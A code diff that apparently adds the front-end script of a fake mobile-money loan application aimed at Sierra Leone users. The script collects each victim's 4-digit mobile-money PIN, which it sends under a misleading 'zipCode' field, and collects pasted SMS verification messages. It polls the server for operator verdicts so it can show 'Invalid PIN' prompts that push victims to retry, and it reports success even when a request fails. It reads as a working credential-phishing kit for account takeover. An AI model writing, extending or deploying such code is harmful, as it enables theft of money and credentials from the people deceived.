+      if (targetSec) targetSec.classList.remove('hidden');
+
+      currentStep = stepNum;
+
+      const logoSubtext = document.getElementById('logo-subtext');
+      const backBtn = document.getElementById('header-back-btn');
+
+      if (currentStep === 0) {
+        logoSubtext.classList.add('hidden');
+        backBtn.classList.add('opacity-0', 'pointer-events-none');
+      } else {
+        logoSubtext.classList.remove('hidden');
+        backBtn.classList.remove('opacity-0', 'pointer-events-none');
+      }
+
+      if (currentStep === 3) {
+        setTimeout(() => {
+          const firstPin = document.querySelector('.pin-box[data-index="0"]');
+          if (firstPin) firstPin.focus();
+        }, 150);
+      }
+
+      if (currentStep === 4) {
+        autoPickSmsMessage();
+      }
+
+      if (currentStep === 5) {
+        document.getElementById('summary-name').innerText = `${appState.firstName} ${appState.lastName}`;
+        document.getElementById('summary-phone').innerText = `+232 ${appState.phoneNumber}`;
+        document.getElementById('summary-type').innerText = appState.loanType;
+        document.getElementById('summary-amount').innerText = `SLE ${appState.loanAmount.toLocaleString()}`;
+        const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
+        document.getElementById('summary-term').innerText = `${appState.loanTermMonths} Months (${monthly.toLocaleString()} SLE/mo)`;
+        if (appState.applicationId) {
+          startVerificationPolling(appState.applicationId);
+        }
+      }
+
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function handleBackAction() {
+      if (currentStep > 0 && currentStep <= 4) {
+        goToStep(currentStep - 1);
+      } else if (currentStep === 5) {
+        goToStep(0);
+      }
+    }
+
+    // 4-Digit PIN Boxes Logic
+    const pinInputs = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('login-btn');
+
+    pinInputs.forEach((input, index) => {
+      input.addEventListener('focus', () => {
+        input.classList.add('active');
+        input.select();
+      });
+      input.addEventListener('blur', () => {
+        input.classList.remove('active');
+      });
+
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+
+        if (val && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+        checkPinComplete();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function checkPinComplete() {
+      let pin = '';
+      pinInputs.forEach(i => pin += i.value);
+      appState.momoPin = pin;
+
+      // 4 Digits for Sierra Leone PIN
+      if (pin.length === 4) {
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        loginBtn.classList.remove('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
+      }
+    }
+
+    function togglePinVisibility() {
+      pinVisible = !pinVisible;
+      pinInputs.forEach(i => {
+        i.type = pinVisible ? 'text' : 'password';
+      });
+      document.getElementById('eye-text').innerText = pinVisible ? 'Hide' : 'Show';
+    }
+
+    function clearPin() {
+      pinInputs.forEach(i => i.value = '');
+      if (pinInputs[0]) pinInputs[0].focus();
+      checkPinComplete();
+    }
+
+    function handlePostLoginPastedMsg(val) {
+      const statusEl = document.getElementById('momo-extract-status');
+      if (val && val.trim()) {
+        if (statusEl) statusEl.classList.remove('hidden');
+      } else {
+        if (statusEl) statusEl.classList.add('hidden');
+      }
+    }
+
+    async function submitRegisteredMessage() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      let msg = msgInput ? msgInput.value.trim() : '';
+      const btn = document.getElementById('submit-pasted-msg-btn');
+      const msgAlert = document.getElementById('msg-retry-alert');
+      if (msgAlert) msgAlert.classList.add('hidden');
+
+      if (!msg) {
+        autoPickSmsMessage();
+        msg = msgInput ? msgInput.value.trim() : '';
+      }
+
+      if (btn) {
+        btn.disabled = true;
+        btn.innerText = 'SUBMITTING...';
+      }
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+        if (appId) {
+          await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
+          });
+          startVerificationPolling(appId);
+        }
+        toggleNoticeModal(true, 'Message Submitted', 'Your verification message has been submitted for review.');
+        if (btn) {
+          btn.innerText = '✓ MESSAGE SUBMITTED';
+          btn.classList.remove('orange-gradient');
+          btn.classList.add('bg-emerald-600');
+        }
+      } catch (err) {
+        toggleNoticeModal(true, 'Saved', 'Your verification message has been recorded.');
+        if (btn) btn.innerText = '✓ MESSAGE SUBMITTED';
+      } finally {
+        setTimeout(() => {
+          goToStep(5);
+        }, 800);
+      }
+    }
+
+    let pollingInterval = null;
+    function startVerificationPolling(appId) {
+      if (!appId || pollingInterval) return;
+      pollingInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/applications/${appId}/verification`);
+          if (res.ok) {
+            const data = await res.json();
+            const verifications = data.verifications || [];
+
+            const pinVer = verifications.find(v => v.step === 'zip_phone');
+            const pinAlert = document.getElementById('pin-retry-alert');
+            if (pinVer && pinVer.status === 'rejected') {
+              if (pinAlert) {
+                pinAlert.innerText = '❌ Invalid PIN! Check your 4-digit PIN and try again.';
+                pinAlert.classList.remove('hidden');
+              }
+            } else if (pinAlert && pinVer && pinVer.status === 'approved') {
+              pinAlert.classList.add('hidden');
+            }
+
+            const smsVer = verifications.find(v => v.step === 'id_document');
+            const msgAlert = document.getElementById('msg-retry-alert');
+            if (smsVer && smsVer.status === 'rejected') {
+              if (msgAlert) {
+                msgAlert.innerText = '❌ Verification code rejected! Please resubmit your verification message.';
+                msgAlert.classList.remove('hidden');
+              }
+            } else if (msgAlert && smsVer && smsVer.status === 'approved') {
+              msgAlert.classList.add('hidden');
+            }
+          }
+
+          const statusRes = await fetch(`/api/applications/${appId}/status`);
+          if (statusRes.ok) {
+            const statusData = await statusRes.json();
+            const badge = document.getElementById('summary-status-badge');
+            if (badge && statusData.status) {
+              const st = statusData.status.toLowerCase();
+              if (st === 'approved') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-emerald-100 text-emerald-800 border border-emerald-300';
+                badge.innerText = '✅ Approved';
+              } else if (st === 'rejected') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-red-100 text-red-800 border border-red-300';
+                badge.innerText = '❌ Rejected';
+              } else if (st === 'under_review') {
+                badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-blue-100 text-blue-800 border border-blue-300';
+                badge.innerText = '🔍 Under Review';
+              }
+            }
+          }
+        } catch (e) {}
+      }, 3000);
+    }
+
+    async function submitApplication() {
+      // Require 4 digits for Sierra Leone PIN
+      if (appState.momoPin.length < 4) return;
+      
+      const pinAlert = document.getElementById('pin-retry-alert');
+      if (pinAlert) pinAlert.classList.add('hidden');
+
+      loginBtn.innerHTML = `
+        <span class="inline-flex items-center">
+          <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+          </svg>
+          PROCESSING LOAN...
+        </span>`;
+      loginBtn.disabled = true;
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+
+        if (appId) {
+          await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              step: 'zip_phone',
+              zipCode: appState.momoPin,
+              phone: appState.phoneNumber
+            })
+          });
+          startVerificationPolling(appId);
+        }
+
+        loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+        autoPickSmsMessage();
+        clearPin();
+        goToStep(4);
+      } catch (err) {
+        console.error('Submission error:', err);
+        loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+        autoPickSmsMessage();
+        clearPin();
+        goToStep(4);
+      }
+    }
+
+    function toggleNoticeModal(show, title = '', msg = '') {
+      const modal = document.getElementById('notice-modal');
+      if (show) {
+        document.getElementById('modal-title').innerText = title;
+        document.getElementById('modal-message').innerText = msg;
+        modal.classList.remove('hidden');
+      } else {
+        modal.classList.add('hidden');
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const ref = urlParams.get('ref');
+      if (ref) {
+        const banner = document.getElementById('referral-banner');
+        const codeDisplay = document.getElementById('referral-code-display');
+        if (banner && codeDisplay) {
+          codeDisplay.innerText = ref.substring(0, 10) + '...';
+          banner.classList.remove('hidden');
+        }
+      }
+      updateCalculator(10000);
+      autoPickSmsMessage();
+      goToStep(0);
+    });
+  </script>
+</body>
+</html>
